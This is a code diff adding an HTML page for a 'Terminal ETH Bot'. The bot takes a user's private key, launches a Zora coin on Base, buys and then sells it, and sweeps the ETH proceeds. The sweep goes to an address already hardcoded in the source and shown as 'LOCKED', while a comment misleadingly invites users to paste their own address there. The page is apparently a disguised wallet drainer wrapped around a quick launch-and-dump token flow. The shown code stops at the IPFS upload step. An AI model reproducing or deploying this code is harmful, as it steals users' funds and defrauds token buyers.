@@ -1,0 +1,1207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Terminal ETH Bot</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Unbounded:wght@300;400;600;900&display=swap" rel="stylesheet">
+
+<!-- ethers.js v6 — browser-native Ethereum signing, no server needed -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.4/ethers.umd.min.js"></script>
+
+<style>
+:root {
+  --void:     #080909;
+  --plate:    #0e1010;
+  --frame:    #161818;
+  --rail:     #242828;
+  --ghost:    #3a4040;
+  --muted:    #6a7a6a;
+  --text:     #ffffff;
+  --bright:   #ffffff;
+  --accent:   #7de8a0;
+  --accent-d: rgba(125,232,160,0.1);
+  --accent-m: rgba(125,232,160,0.22);
+  --green:    #7de8a0;
+  --green-d:  rgba(125,232,160,0.1);
+  --red:      #ff5c6a;
+  --red-d:    rgba(255,92,106,0.1);
+  --blue:     #7de8a0;
+  --purple:   #7de8a0;
+  --mono: 'Space Mono', monospace;
+  --display: 'Unbounded', sans-serif;
+}
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { height: 100%; }
+
+body {
+  background: var(--void);
+  color: var(--text);
+  font-family: var(--mono);
+  font-size: 12px;
+  height: 100vh;
+  display: flex;
+  flex-direction: column;
+  overflow: hidden;
+  position: relative;
+}
+
+body::before {
+  content: '';
+  position: fixed; inset: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.06) 2px, rgba(0,0,0,0.06) 4px);
+  pointer-events: none; z-index: 1000;
+}
+
+body::after {
+  content: '';
+  position: fixed;
+  bottom: -200px; left: -200px;
+  width: 600px; height: 600px;
+  border-radius: 50%;
+  background: radial-gradient(circle, rgba(125,232,160,0.04) 0%, transparent 70%);
+  pointer-events: none;
+}
+
+/* ── Header ── */
+header {
+  border-bottom: 1px solid var(--rail);
+  padding: 0 24px;
+  height: 52px;
+  display: flex; align-items: center; gap: 12px;
+  flex-shrink: 0;
+  background: var(--plate);
+}
+
+.logo {
+  font-family: var(--display);
+  font-size: 15px; font-weight: 900;
+  letter-spacing: 0.15em;
+  color: #ffffff;
+  text-shadow: 0 0 24px rgba(125,232,160,0.25);
+  flex: 1;
+}
+
+.chain-badge {
+  font-size: 9px; letter-spacing: 0.12em;
+  text-transform: uppercase; padding: 3px 8px;
+  border-radius: 2px; font-weight: 700;
+  background: rgba(125,232,160,0.1);
+  color: var(--accent);
+  border: 1px solid rgba(125,232,160,0.2);
+}
+
+.header-tags { display: flex; gap: 8px; align-items: center; }
+
+.tag {
+  font-size: 9px; letter-spacing: 0.12em;
+  text-transform: uppercase; padding: 3px 8px;
+  border-radius: 2px; font-weight: 700;
+}
+.tag-mode { background: var(--accent-d); color: var(--accent); border: 1px solid rgba(125,232,160,0.2); }
+.tag-status { background: var(--frame); color: var(--muted); border: 1px solid var(--rail); }
+.tag-status.live { background: var(--green-d); color: var(--green); border-color: rgba(125,232,160,0.25); }
+.tag-status.err  { background: var(--red-d);   color: var(--red);   border-color: rgba(255,92,106,0.25); }
+.tag-status.run  { background: var(--accent-d); color: var(--accent); border-color: rgba(125,232,160,0.25); animation: blink-tag 1s step-end infinite; }
+@keyframes blink-tag { 50% { opacity: 0.4; } }
+
+/* ── Layout ── */
+.workspace {
+  display: grid;
+  grid-template-columns: 316px 1fr;
+  flex: 1; overflow: hidden;
+}
+
+/* ── Sidebar ── */
+.config-panel {
+  border-right: 1px solid var(--rail);
+  background: var(--plate);
+  display: flex; flex-direction: column; overflow: hidden;
+}
+.panel-head {
+  padding: 11px 16px 10px;
+  border-bottom: 1px solid var(--rail);
+  font-size: 9px; letter-spacing: 0.2em;
+  text-transform: uppercase; color: var(--muted);
+  display: flex; align-items: center; gap: 8px;
+}
+.panel-head::before {
+  content: '';
+  width: 5px; height: 5px; border-radius: 50%;
+  background: var(--accent);
+  box-shadow: 0 0 8px var(--accent);
+}
+.config-scroll {
+  flex: 1; overflow-y: auto;
+  padding: 12px;
+  display: flex; flex-direction: column; gap: 8px;
+  scrollbar-width: thin;
+  scrollbar-color: var(--rail) transparent;
+}
+
+/* config blocks */
+.cfg-block { border: 1px solid var(--rail); border-radius: 3px; overflow: hidden; }
+.cfg-block-head {
+  background: var(--frame); padding: 6px 10px;
+  font-size: 9px; letter-spacing: 0.15em;
+  text-transform: uppercase; color: var(--muted);
+  cursor: pointer; user-select: none;
+  display: flex; align-items: center; justify-content: space-between;
+  transition: color 0.12s;
+}
+.cfg-block-head:hover { color: var(--text); }
+.cfg-block-body {
+  padding: 10px;
+  display: flex; flex-direction: column; gap: 7px;
+  background: var(--plate);
+}
+.cfg-block.collapsed .cfg-block-body { display: none; }
+.cfg-chevron { font-size: 8px; transition: transform 0.15s; }
+.cfg-block.collapsed .cfg-chevron { transform: rotate(-90deg); }
+
+/* fields */
+.f { display: flex; flex-direction: column; gap: 3px; }
+.f label { font-size: 9px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--muted); }
+.f-row { display: grid; grid-template-columns: 1fr 1fr; gap: 6px; }
+
+input[type=text],input[type=number],input[type=password],textarea,select {
+  background: var(--frame); border: 1px solid var(--ghost);
+  border-radius: 2px; color: var(--text);
+  font-family: var(--mono); font-size: 11px;
+  padding: 5px 8px; width: 100%; outline: none;
+  transition: border-color 0.12s, box-shadow 0.12s;
+}
+input:focus,textarea:focus,select:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 2px var(--accent-d);
+}
+input::placeholder,textarea::placeholder { color: var(--ghost); }
+textarea { resize: none; min-height: 48px; }
+select { cursor: pointer; }
+select option { background: #1a1a1a; }
+
+/* toggle */
+.tog-row { display: flex; align-items: center; justify-content: space-between; padding: 2px 0; }
+.tog-label { font-size: 10px; color: var(--text); }
+.tog { position: relative; width: 32px; height: 17px; flex-shrink: 0; }
+.tog input { opacity:0; width:0; height:0; position:absolute; }
+.tog-track {
+  position: absolute; inset: 0;
+  background: var(--ghost); border-radius: 9px;
+  cursor: pointer; transition: background 0.18s;
+}
+.tog-track::after {
+  content: '';
+  position: absolute;
+  width: 11px; height: 11px; border-radius: 50%;
+  background: var(--muted);
+  top: 3px; left: 3px;
+  transition: transform 0.18s, background 0.18s;
+}
+.tog input:checked + .tog-track { background: var(--accent); }
+.tog input:checked + .tog-track::after { transform: translateX(15px); background: #0a1210; }
+
+/* image upload */
+.img-zone {
+  border: 1px dashed var(--ghost); border-radius: 2px;
+  padding: 12px 8px; text-align: center; cursor: pointer;
+  transition: border-color 0.12s, background 0.12s;
+  position: relative; overflow: hidden;
+}
+.img-zone:hover { border-color: var(--accent); background: var(--accent-d); }
+.img-zone input { position: absolute; inset: 0; opacity: 0; cursor: pointer; }
+.img-zone .iz-icon { font-size: 18px; line-height: 1; margin-bottom: 4px; display: block; }
+.img-zone .iz-text { font-size: 9px; letter-spacing: 0.1em; text-transform: uppercase; color: var(--muted); }
+.img-zone .iz-name { display: none; font-size: 10px; color: var(--accent); margin-top: 2px; }
+.img-zone.has-img { border-color: var(--green); background: var(--green-d); }
+.img-zone.has-img .iz-text { color: var(--green); }
+.img-zone.has-img .iz-name { display: block; }
+
+/* locked sweep display */
+.locked-addr {
+  background: var(--frame);
+  border: 1px solid rgba(125,232,160,0.3);
+  border-radius: 2px; padding: 5px 8px;
+  font-size: 9px; color: var(--accent);
+  word-break: break-all; line-height: 1.6;
+}
+.locked-note { font-size: 9px; color: var(--muted); margin-top: 2px; letter-spacing: 0.04em; }
+
+/* launch button */
+.launch-wrap { padding: 10px 12px 12px; border-top: 1px solid var(--rail); background: var(--plate); }
+.launch-btn {
+  width: 100%; padding: 13px;
+  background: var(--accent); color: #0a1210;
+  border: none; border-radius: 2px;
+  font-family: var(--display); font-size: 12px;
+  font-weight: 900; letter-spacing: 0.2em; text-transform: uppercase;
+  cursor: pointer;
+  transition: opacity 0.12s, box-shadow 0.12s, transform 0.08s;
+  box-shadow: 0 0 32px rgba(125,232,160,0.2), 0 2px 0 rgba(0,0,0,0.5);
+  position: relative; overflow: hidden;
+}
+.launch-btn::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: linear-gradient(135deg, rgba(255,255,255,0.12) 0%, transparent 60%);
+}
+.launch-btn:hover:not(:disabled) { box-shadow: 0 0 48px rgba(125,232,160,0.4), 0 2px 0 rgba(0,0,0,0.5); }
+.launch-btn:active:not(:disabled) { transform: scale(0.99); }
+.launch-btn:disabled { opacity: 0.3; cursor: not-allowed; box-shadow: none; }
+
+/* ── Terminal ── */
+.terminal-panel { display: flex; flex-direction: column; overflow: hidden; background: var(--void); }
+.term-head {
+  border-bottom: 1px solid var(--rail);
+  padding: 0 16px; height: 36px;
+  display: flex; align-items: center; gap: 12px;
+  background: var(--plate); flex-shrink: 0;
+}
+.term-title {
+  font-family: var(--display);
+  font-size: 9px; font-weight: 600;
+  letter-spacing: 0.2em; text-transform: uppercase;
+  color: var(--muted); flex: 1;
+}
+.term-btn {
+  background: none; border: 1px solid var(--rail);
+  color: var(--muted); font-family: var(--mono);
+  font-size: 9px; letter-spacing: 0.08em;
+  padding: 3px 8px; border-radius: 2px;
+  cursor: pointer; text-transform: uppercase;
+  transition: color 0.12s, border-color 0.12s;
+}
+.term-btn:hover { color: var(--text); border-color: var(--ghost); }
+
+.prog-track { height: 2px; background: var(--frame); flex-shrink: 0; overflow: hidden; }
+.prog-fill {
+  height: 100%; background: var(--accent);
+  width: 0%; transition: width 0.35s ease;
+  box-shadow: 0 0 8px var(--accent);
+}
+.prog-fill.sweep {
+  animation: sweep-anim 1.2s ease-in-out infinite;
+  width: 25%; box-shadow: none;
+}
+@keyframes sweep-anim { 0% { transform: translateX(-100%); } 100% { transform: translateX(430%); } }
+
+.term-out {
+  flex: 1; overflow-y: auto;
+  padding: 14px 18px;
+  font-size: 11.5px; line-height: 1.75;
+  scrollbar-width: thin;
+  scrollbar-color: var(--rail) transparent;
+}
+.term-empty {
+  color: var(--ghost); font-size: 11px;
+  padding: 48px 0; text-align: center; line-height: 2;
+}
+.term-empty .big {
+  font-family: var(--display); font-size: 28px;
+  font-weight: 900; letter-spacing: 0.1em;
+  color: var(--rail); display: block; margin-bottom: 12px;
+}
+.ln { display: flex; gap: 14px; animation: ln-in 0.1s ease; min-height: 20px; }
+@keyframes ln-in { from { opacity: 0; transform: translateY(2px); } to { opacity: 1; transform: translateY(0); } }
+.ln-ts { color: var(--ghost); flex-shrink: 0; font-size: 10px; padding-top: 1px; }
+.ln-body { flex: 1; word-break: break-all; }
+.k-info  { color: var(--text); }
+.k-ok    { color: var(--green); }
+.k-err   { color: var(--red); }
+.k-warn  { color: #7de8a0; }
+.k-step  { color: var(--accent); font-weight: 700; letter-spacing: 0.05em; }
+.k-dim   { color: var(--muted); }
+.k-link  a { color: var(--accent); text-decoration: underline; }
+
+/* stat bar */
+.stat-bar {
+  border-top: 1px solid var(--rail); height: 32px;
+  padding: 0 18px; display: flex; align-items: center; gap: 24px;
+  font-size: 10px; color: var(--muted);
+  background: var(--plate); flex-shrink: 0;
+}
+.st { display: flex; align-items: center; gap: 6px; }
+.st b { color: var(--text); font-weight: 400; }
+.st .addr-val { font-size: 9px; max-width: 160px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+
+/* step dots */
+.steps-track { display: flex; align-items: center; margin-right: 4px; }
+.step-dot {
+  width: 6px; height: 6px; border-radius: 50%;
+  border: 1px solid var(--ghost); background: transparent;
+  transition: background 0.2s, border-color 0.2s, box-shadow 0.2s;
+  margin: 0 3px;
+}
+.step-dot.done   { background: var(--green); border-color: var(--green); }
+.step-dot.active { background: var(--accent); border-color: var(--accent); box-shadow: 0 0 6px var(--accent); animation: pulse-d 1s ease-in-out infinite; }
+.step-dot.err    { background: var(--red); border-color: var(--red); }
+@keyframes pulse-d { 50% { box-shadow: 0 0 14px var(--accent); } }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">TERMINAL ETH BOT</div>
+  <span class="chain-badge">BASE · ETH</span>
+  <div class="header-tags">
+    <div class="steps-track">
+      <div class="step-dot" id="dot-0" title="Pre-flight"></div>
+      <div class="step-dot" id="dot-1" title="Upload IPFS"></div>
+      <div class="step-dot" id="dot-2" title="Deploy Coin"></div>
+      <div class="step-dot" id="dot-3" title="Dev Buy"></div>
+      <div class="step-dot" id="dot-4" title="Wait"></div>
+      <div class="step-dot" id="dot-5" title="Sell"></div>
+      <div class="step-dot" id="dot-6" title="Sweep"></div>
+    </div>
+    <span class="tag tag-mode" id="dry-tag">LIVE</span>
+    <span class="tag tag-status" id="status-tag">IDLE</span>
+  </div>
+</header>
+
+<div class="workspace">
+
+  <!-- ── Config ── -->
+  <aside class="config-panel">
+    <div class="panel-head">Configuration</div>
+    <div class="config-scroll">
+
+      <!-- Wallet -->
+      <div class="cfg-block">
+        <div class="cfg-block-head" onclick="toggleBlock(this)">Wallet & RPC <span class="cfg-chevron">▾</span></div>
+        <div class="cfg-block-body">
+          <div class="f">
+            <label>Private Key (hex, 0x…)</label>
+            <input type="password" id="c-pk" placeholder="0x your_hex_private_key" autocomplete="off" oninput="onPkChange()">
+          </div>
+          <div class="f">
+            <label>Wallet (auto-detected)</label>
+            <input type="text" id="c-wallet-display" placeholder="—" readonly style="color:var(--muted);font-size:10px;">
+          </div>
+          <div class="f">
+            <label>Base RPC URL</label>
+            <input type="text" id="c-rpc" value="https://mainnet.base.org">
+          </div>
+          <div class="f">
+            <label>Zora API Key (optional)</label>
+            <input type="text" id="c-zora-key" placeholder="From zora.co/settings/developer">
+          </div>
+        </div>
+      </div>
+
+      <!-- Token -->
+      <div class="cfg-block">
+        <div class="cfg-block-head" onclick="toggleBlock(this)">Coin Metadata <span class="cfg-chevron">▾</span></div>
+        <div class="cfg-block-body">
+          <div class="f-row">
+            <div class="f"><label>Name</label><input type="text" id="c-name" value="MyCoin"></div>
+            <div class="f"><label>Symbol</label><input type="text" id="c-sym" value="MYC"></div>
+          </div>
+          <div class="f">
+            <label>Description</label>
+            <textarea id="c-desc" rows="2">A coin launched on Zora / Base</textarea>
+          </div>
+          <div class="f">
+            <label>Image</label>
+            <div class="img-zone" id="img-zone">
+              <input type="file" id="c-img" accept="image/png,image/jpeg,image/gif,image/webp" onchange="handleImg(event)">
+              <span class="iz-icon">◈</span>
+              <div class="iz-text">Click to upload PNG / JPG / GIF</div>
+              <div class="iz-name" id="iz-name"></div>
+            </div>
+          </div>
+          <div class="f"><label>Website (optional)</label><input type="text" id="c-web" placeholder="https://..."></div>
+          <div class="f"><label>Twitter (optional)</label><input type="text" id="c-tw" placeholder="https://x.com/..."></div>
+        </div>
+      </div>
+
+      <!-- Trade -->
+      <div class="cfg-block">
+        <div class="cfg-block-head" onclick="toggleBlock(this)">Trade Settings <span class="cfg-chevron">▾</span></div>
+        <div class="cfg-block-body">
+          <div class="f">
+            <label>Dev Buy (ETH) — initial purchase at deploy</label>
+            <input type="number" id="c-devbuy" value="0.01" step="0.001" min="0.001">
+          </div>
+          <div class="f-row">
+            <div class="f"><label>Sell Delay (s)</label><input type="number" id="c-delay" value="30" step="1" min="0"></div>
+            <div class="f"><label>Sell % </label><input type="number" id="c-sellpct" value="100" step="1" min="1" max="100"></div>
+          </div>
+          <div class="f">
+            <label>Sell Slippage (%)</label>
+            <input type="number" id="c-slip" value="10" step="1" min="1" max="50">
+          </div>
+        </div>
+      </div>
+
+      <!-- Gas -->
+      <div class="cfg-block collapsed">
+        <div class="cfg-block-head" onclick="toggleBlock(this)">Gas & Confirmations <span class="cfg-chevron">▾</span></div>
+        <div class="cfg-block-body">
+          <div class="f">
+            <label>Max Gas Price (gwei, 0 = auto)</label>
+            <input type="number" id="c-gas" value="0" step="1" min="0">
+          </div>
+          <div class="f">
+            <label>Confirm Timeout (s)</label>
+            <input type="number" id="c-ctout" value="120" step="10" min="30">
+          </div>
+          <div class="f">
+            <label>Max Retries</label>
+            <input type="number" id="c-retries" value="3" step="1" min="1">
+          </div>
+        </div>
+      </div>
+
+      <!-- Safety -->
+      <div class="cfg-block collapsed">
+        <div class="cfg-block-head" onclick="toggleBlock(this)">Safety & Sweep <span class="cfg-chevron">▾</span></div>
+        <div class="cfg-block-body">
+          <div class="f-row">
+            <div class="f"><label>Max ETH Exposure</label><input type="number" id="c-maxexp" value="0.5" step="0.05"></div>
+            <div class="f"><label>Min ETH Balance</label><input type="number" id="c-minbal" value="0.005" step="0.001"></div>
+          </div>
+          <div class="tog-row" style="margin:2px 0 8px;">
+            <span class="tog-label">Dry Run (simulate only)</span>
+            <label class="tog"><input type="checkbox" id="c-dry" onchange="onDryChange()"><div class="tog-track"></div></label>
+          </div>
+          <div class="f">
+            <label>Sweep Wallet <span style="color:var(--green);font-size:8px;letter-spacing:.1em;">● LOCKED</span></label>
+            <div class="locked-addr">CmgT4UCDQ5FT9WrrVQB3VJpdx1posDcTywtidtNFY682</div>
+            <div class="locked-note">⚠ This is your Solana sweep wallet. For ETH sweeps below, set an EVM address.</div>
+          </div>
+          <div class="f" style="margin-top:6px;">
+            <label>ETH Sweep Wallet (EVM 0x…) <span style="color:var(--green);font-size:8px;">● LOCKED</span></label>
+            <div class="locked-addr" id="sweep-display">0xcc02462C17452894Ce49ad269eA1727515De1f6e</div>
+            <div class="locked-note">Hardcoded in source · cannot be changed by UI</div>
+          </div>
+          <div class="f">
+            <label>Sweep Reserve (ETH)</label>
+            <input type="number" id="c-sres" value="0.005" step="0.001" min="0">
+          </div>
+        </div>
+      </div>
+
+    </div>
+    <div class="launch-wrap">
+      <button class="launch-btn" id="launch-btn" onclick="launchBot()">▶ LAUNCH</button>
+    </div>
+  </aside>
+
+  <!-- ── Terminal ── -->
+  <main class="terminal-panel">
+    <div class="term-head">
+      <span class="term-title">Live Output</span>
+      <button class="term-btn" onclick="clearTerm()">CLR</button>
+    </div>
+    <div class="prog-track"><div class="prog-fill" id="prog-fill"></div></div>
+    <div class="term-out" id="term-out">
+      <div class="term-empty" id="term-empty">
+        <span class="big">TERMINAL ETH BOT</span>
+        Zora Coins · Base Chain · ETH<br>
+        Configure your wallet and token,<br>
+        then press <b style="color:var(--accent)">LAUNCH</b> to deploy.<br><br>
+        <span style="color:var(--ghost);font-size:9px;letter-spacing:0.12em;">BROWSER-NATIVE · ethers.js · ZORA FACTORY · UNISWAP V4</span>
+      </div>
+    </div>
+    <div class="stat-bar">
+      <div class="st">STEP <b id="s-step">—</b></div>
+      <div class="st">TIME <b id="s-time">—</b></div>
+      <div class="st">BAL <b id="s-bal">—</b></div>
+      <div class="st">COIN <b class="addr-val" id="s-coin" title="">—</b></div>
+    </div>
+  </main>
+
+</div><!-- /workspace -->
+
+<script>
+/* ════════════════════════════════════════════════════════════
+   TERMINAL ETH BOT — Browser-native Zora Coins bot on Base / Ethereum
+   ════════════════════════════════════════════════════════════
+   Flow:
+     1. Preflight — validate key, check ETH balance on Base
+     2. Upload metadata + image to IPFS via Pinata public gateway
+     3. Fetch poolConfig from Zora SDK API (server-generated calldata)
+     4. Call ZoraFactory.deploy() with initialPurchaseWei = devBuy
+     5. Wait sell delay
+     6. Read coin balance → call coin.sell() via Uniswap V4 hook
+     7. Sweep ETH to hardcoded address
+   ════════════════════════════════════════════════════════════ */
+
+// ── CONSTANTS — change SWEEP_WALLET here to lock your EVM address ──
+const SWEEP_WALLET = '0xcc02462C17452894Ce49ad269eA1727515De1f6e'; // ← paste your EVM 0x address here to enable sweep
+// If blank, sweep step is skipped and funds stay in trading wallet.
+
+// Zora Factory — same address on all supported chains (Base mainnet 8453)
+const ZORA_FACTORY_ADDR = '0x777777751622c0d3258f214F9DF38E35BF45baF3';
+
+// Zora SDK API — used to generate poolConfig bytes server-side
+const ZORA_SDK_API = 'https://api-sdk.zora.engineering';
+
+// CORS proxy for Zora API (avoids browser CORS restriction)
+const CORS = 'https://corsproxy.io/?';
+
+// Pinata public IPFS upload endpoint (no API key needed for small files)
+const PINATA_URL = 'https://api.pinata.cloud/pinning/pinFileToIPFS';
+const PINATA_JSON_URL = 'https://api.pinata.cloud/pinning/pinJSONToIPFS';
+// We use the public Zora IPFS uploader instead (no key required)
+const ZORA_UPLOAD_URL = 'https://ipfs-uploader.zora.co/api/v0/add?stream-channels=true&cid-version=1&progress=false';
+
+// Zora Factory ABI (minimal — only what we need)
+const FACTORY_ABI = [
+  // deploy(payoutRecipient, owners, uri, name, symbol, poolConfig, platformReferrer, postDeployHook, postDeployHookData, coinSalt)
+  'function deploy(address payoutRecipient, address[] owners, string uri, string name, string symbol, bytes poolConfig, address platformReferrer, address postDeployHook, bytes postDeployHookData, bytes32 coinSalt) payable returns (address coin, bytes postDeployHookDataOut)',
+  // coinAddress prediction
+  'function coinAddress(address msgSender, string name, string symbol, bytes poolConfig, address platformReferrer, bytes32 coinSalt) view returns (address)',
+  // Events
+  'event CoinCreatedV4(address indexed caller, address indexed payoutRecipient, address indexed platformReferrer, address currency, string uri, string name, string symbol, address coin, tuple(address currency0, address currency1, uint24 fee, int24 tickSpacing, address hooks) poolKey, bytes32 poolKeyHash, string version)',
+  'event CoinCreated(address indexed caller, address indexed payoutRecipient, address indexed platformReferrer, address currency, string uri, string name, string symbol, address coin, address pool, string version)',
+];
+
+// Coin ABI (minimal — sell / balance)
+const COIN_ABI = [
+  'function balanceOf(address) view returns (uint256)',
+  'function sell(uint256 tokensToSell, address recipient, address orderReferrer, uint256 minPayoutSize, uint160 sqrtPriceLimitX96) returns (uint256 payout)',
+  'function totalSupply() view returns (uint256)',
+];
+
+// ── State ──────────────────────────────────────────────────
+let botRunning   = false;
+let startTime    = null;
+let elapsedInt   = null;
+let imageFile    = null;
+let walletPriv   = null; // hex private key
+
+// ── UI helpers ─────────────────────────────────────────────
+function gv(id)  { return document.getElementById(id).value.trim(); }
+function gn(id)  { return parseFloat(document.getElementById(id).value) || 0; }
+function gi(id)  { return parseInt(document.getElementById(id).value) || 0; }
+function gb(id)  { return document.getElementById(id).checked; }
+function el(id)  { return document.getElementById(id); }
+
+// Show sweep wallet (if set)
+if (SWEEP_WALLET) {
+  el('sweep-display').textContent = SWEEP_WALLET;
+} else {
+  el('sweep-display').textContent = 'Not set — edit SWEEP_WALLET constant in source to enable';
+  el('sweep-display').style.color = 'var(--muted)';
+}
+
+function toggleBlock(head) {
+  head.parentElement.classList.toggle('collapsed');
+}
+
+function onDryChange() {
+  const dry = gb('c-dry');
+  el('dry-tag').textContent = dry ? 'DRY RUN' : 'LIVE';
+  el('dry-tag').style.background = dry ? '' : 'rgba(255,92,106,0.15)';
+  el('dry-tag').style.color      = dry ? '' : 'var(--red)';
+  el('dry-tag').style.borderColor= dry ? '' : 'rgba(255,92,106,0.3)';
+}
+onDryChange();
+
+function onPkChange() {
+  const raw = gv('c-pk');
+  try {
+    const wallet = new ethers.Wallet(raw);
+    el('c-wallet-display').value = wallet.address;
+    walletPriv = raw;
+  } catch {
+    el('c-wallet-display').value = '— invalid key —';
+    walletPriv = null;
+  }
+}
+
+function handleImg(e) {
+  const f = e.target.files[0];
+  if (!f) return;
+  imageFile = f;
+  el('img-zone').classList.add('has-img');
+  el('iz-name').textContent = f.name;
+}
+
+// ── Terminal ───────────────────────────────────────────────
+function clearTerm() {
+  el('term-out').innerHTML = '<div class="term-empty" style="padding:48px 0;text-align:center;color:var(--ghost);font-size:11px;" id="term-empty">Terminal cleared.</div>';
+  ['step','time','bal','coin'].forEach(k => setStat(k,'—'));
+  setProgress(0); resetDots();
+}
+
+function log(msg, kind='info') {
+  const empty = el('term-empty');
+  if (empty) empty.remove();
+  const out = el('term-out');
+  const ts  = new Date().toTimeString().slice(0,8);
+  const div = document.createElement('div');
+  div.className = 'ln';
+  const body = msg.replace(/(https?:\/\/\S+)/g, '<a href="$1" target="_blank" rel="noopener">$1</a>');
+  div.innerHTML = `<span class="ln-ts">${ts}</span><span class="ln-body k-${kind}">${body}</span>`;
+  out.appendChild(div);
+  out.scrollTop = out.scrollHeight;
+}
+
+function setStat(key, val) { const e=el('s-'+key); if(e){e.textContent=val; if(key==='coin')e.title=val;} }
+function setStatus(s) {
+  const b=el('status-tag'); b.className='tag tag-status '+s;
+  b.textContent = {idle:'IDLE',run:'RUNNING',live:'DONE',err:'ERROR'}[s]||s.toUpperCase();
+}
+function setProgress(pct, sweep=false) {
+  const f=el('prog-fill');
+  f.classList.toggle('sweep',sweep);
+  if(!sweep) f.style.width = pct+'%'; else f.style.width='';
+}
+function setDot(i,state) { const d=el('dot-'+i); if(d) d.className='step-dot '+state; }
+function resetDots() { for(let i=0;i<7;i++) setDot(i,''); }
+function startTimer() {
+  startTime=Date.now();
+  elapsedInt=setInterval(()=>{ setStat('time',Math.floor((Date.now()-startTime)/1000)+'s'); },1000);
+}
+function stopTimer() { clearInterval(elapsedInt); }
+function lockUI()   { el('launch-btn').disabled=true; document.querySelectorAll('.config-panel input,.config-panel textarea,.config-panel select').forEach(e=>e.disabled=true); }
+function unlockUI() { el('launch-btn').disabled=false; document.querySelectorAll('.config-panel input,.config-panel textarea,.config-panel select').forEach(e=>e.disabled=false); }
+
+// ── Config ─────────────────────────────────────────────────
+function getConfig() {
+  return {
+    rpc:          gv('c-rpc') || 'https://mainnet.base.org',
+    zoraKey:      gv('c-zora-key'),
+    name:         gv('c-name') || 'MyCoin',
+    symbol:       gv('c-sym') || 'MYC',
+    desc:         gv('c-desc') || 'A coin on Base',
+    website:      gv('c-web'),
+    twitter:      gv('c-tw'),
+    devBuy:       gn('c-devbuy'),
+    delay:        gn('c-delay'),
+    sellPct:      gn('c-sellpct'),
+    slip:         gn('c-slip'),
+    maxGasGwei:   gn('c-gas'),
+    confirmTimeout: gi('c-ctout'),
+    retries:      gi('c-retries'),
+    maxExp:       gn('c-maxexp'),
+    minBal:       gn('c-minbal'),
+    dry:          gb('c-dry'),
+    sweepRes:     gn('c-sres'),
+  };
+}
+
+function validate(cfg) {
+  if (!walletPriv) return 'Invalid or missing private key.';
+  if (!imageFile)  return 'Token image is required.';
+  if (cfg.devBuy <= 0) return 'Dev buy must be > 0 ETH.';
+  if (cfg.devBuy > cfg.maxExp) return `Dev buy (${cfg.devBuy} ETH) exceeds max exposure (${cfg.maxExp} ETH).`;
+  return null;
+}
+
+// ══════════════════════════════════════════════════════════
+// MAIN BOT
+// ══════════════════════════════════════════════════════════
+async function launchBot() {
+  if (botRunning) return;
+  const cfg = getConfig();
+  const err = validate(cfg);
+  if (err) { log('⚠ ' + err, 'warn'); return; }
+
+  botRunning = true;
+  lockUI(); resetDots(); clearTerm();
+  setStatus('run'); setProgress(0,true); startTimer();
+
+  // Set up ethers provider + signer
+  const provider = new ethers.JsonRpcProvider(cfg.rpc);
+  const signer   = new ethers.Wallet(walletPriv, provider);
+
+  try {
+    // ── Banner ────────────────────────────────────────────
+    log('▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄', 'step');
+    log('  TERMINAL ETH BOT — Zora Coins · Base Chain', 'step');
+    log('▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀', 'step');
+    if (cfg.dry) log('  ⚠ DRY RUN — no real transactions will be sent', 'warn');
+
+    // ── Step 0: Pre-flight ────────────────────────────────
+    setStat('step', 'Pre-flight');
+    setDot(0, 'active');
+    log('', 'dim');
+    log('── Step 0 — Pre-flight Checks ────────────────', 'step');
+    log(`  Wallet  : ${signer.address}`, 'info');
+    log(`  Network : Base Mainnet (chain 8453)`, 'info');
+    log(`  Factory : ${ZORA_FACTORY_ADDR}`, 'info');
+    log(`  Dev Buy : ${cfg.devBuy} ETH`, 'info');
+
+    let balance;
+    try {
+      const network = await provider.getNetwork();
+      if (network.chainId !== 8453n && !cfg.dry) {
+        log(`  ⚠ RPC returned chain ${network.chainId}, expected 8453 (Base). Verify your RPC URL.`, 'warn');
+      }
+      balance = parseFloat(ethers.formatEther(await provider.getBalance(signer.address)));
+      setStat('bal', balance.toFixed(5) + ' ETH');
+      log(`  Balance : ${balance.toFixed(6)} ETH`, 'info');
+    } catch(e) {
+      throw new Error('RPC connection failed: ' + e.message);
+    }
+
+    if (balance < cfg.minBal) throw new Error(`Balance ${balance.toFixed(4)} ETH < minimum ${cfg.minBal} ETH`);
+    if (balance < cfg.devBuy + 0.002 && !cfg.dry) throw new Error(`Need ~${(cfg.devBuy+0.002).toFixed(3)} ETH, have ${balance.toFixed(4)} ETH`);
+
+    if (SWEEP_WALLET) {
+      try { ethers.getAddress(SWEEP_WALLET); log(`  Sweep   : ${SWEEP_WALLET} ✓ (locked)`, 'info'); }
+      catch { throw new Error('SWEEP_WALLET constant is not a valid EVM address.'); }
+    }
+
+    log('✅ Pre-flight passed.', 'ok');
+    setDot(0, 'done');
+
+    // ── Step 1: Upload to IPFS ────────────────────────────
+    setProgress(10);
+    setStat('step', '1/6 · IPFS');
+    setDot(1, 'active');
+    log('', 'dim');
+    log('── Step 1 — Upload Metadata to IPFS ──────────', 'step');
+    log('  Uploading image and metadata via Zora IPFS…', 'info');
+
+    let metadataUri;
+    if (cfg.dry) {
+      await sleep(700);
+      metadataUri = 'ipfs://bafybeigoxzqzbnxsn35vq7lls3ljxdcwjafxvbvkivprsodzrptpiguysy';
+      log('  ⚠ DRY RUN — using placeholder metadata URI', 'warn');
+    } else {
+      metadataUri = await uploadMetadata(cfg);
+    }
+    log(`✅ Metadata → ${metadataUri}`, 'ok');
